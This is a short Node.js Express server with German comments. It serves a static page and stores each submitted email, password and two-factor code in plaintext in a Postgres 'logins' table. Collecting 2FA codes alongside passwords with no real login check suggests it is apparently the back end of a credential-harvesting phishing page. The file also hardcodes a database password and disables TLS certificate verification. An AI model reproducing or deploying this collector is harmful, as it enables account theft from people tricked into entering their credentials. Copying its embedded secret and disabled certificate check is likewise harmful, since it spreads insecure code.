const express = require('express');
const { Pool } = require('pg');
const path = require('path');

const app = express();

app.use(express.static('public'));
app.use(express.json());

// DB Verbindung
const pool = new Pool({
  connectionString: process.env.DATABASE_URL || 
    'postgresql://postgres:QcRbOEMYSOJCgHabvblfOyBRQlrvixST@postgres.railway.internal:5432/railway',
  ssl: { rejectUnauthorized: false } // Railway verlangt SSL
});

// Startseite
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Login speichern
app.post('/login', async (req, res) => {
  const { email, password, twofa } = req.body;

  try {
    await pool.query(
      'INSERT INTO logins (email, password, twofa) VALUES ($1, $2, $3)',
      [email, password, twofa]
    );
    res.status(200).end();
  } catch (err) {
    console.error('Fehler beim Speichern:', err);
    res.status(500).end();
  }
});

// Port
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log('Server läuft auf Port ' + PORT);
});